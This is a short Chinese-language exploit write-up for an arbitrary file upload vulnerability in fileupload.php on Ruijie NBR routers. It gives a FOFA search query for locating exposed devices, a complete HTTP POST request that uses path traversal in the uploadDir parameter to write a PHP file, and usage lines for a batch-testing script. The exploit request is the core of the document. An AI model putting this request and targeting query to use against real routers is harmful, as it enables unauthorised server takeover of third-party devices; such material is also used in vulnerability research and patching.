### 1.漏洞描述

锐捷 NBR 路由器 fileupload.php文件存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件到服务器获取服务器权限。

![img](https://cdn.nlark.com/yuque/0/2024/png/42783549/1719486257208-06fe7236-99b8-46fd-92ba-5120cf730c5f.png)

### 2.fofa语法

```plain
app="Ruijie-NBR路由器"
```

### 3.漏洞复现

```plain
POST /ddi/server/fileupload.php?uploadDir=../../321&name=123.php HTTP/1.1
Host: 127.0.0.1
Accept: text/plain, */*; q=0.01
Content-Disposition: form-data; name="file"; filename="111.php"
Content-Type: image/jpeg

<?php phpinfo();?>
```

![img](https://cdn.nlark.com/yuque/0/2024/png/42783549/1719486322716-395afae7-91cc-4134-ad9f-24f3c814ed67.png)

访问拼接路径

![img](https://cdn.nlark.com/yuque/0/2024/png/42783549/1719486369736-c2ce9b63-62dd-4475-98b1-d68b01ba5f72.png)

### 4.py脚本使用

```
python3 文件名 -f url.txt # 批量测试url
python3 文件名 -u http://127.0.0.1 # 单个测试url
```

